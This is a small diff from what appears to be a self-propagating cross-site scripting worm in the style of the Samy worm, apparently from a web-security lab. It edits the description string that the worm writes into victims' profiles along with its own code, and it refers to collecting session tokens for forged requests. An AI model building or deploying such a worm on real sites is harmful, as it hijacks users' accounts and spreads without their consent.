@@ -6,7 +6,7 @@ window.onload = function(){
         "</" + "script>");
 
     // Set the content for the description field
-    var desc = "&description=SAMY IS MY HERO!";
+    var desc = "&description=SAMY IS MY HERO";
         desc+= wormCode + "&accesslevel[description]=2";
     
     // Get the name, guid, timestamp, and token
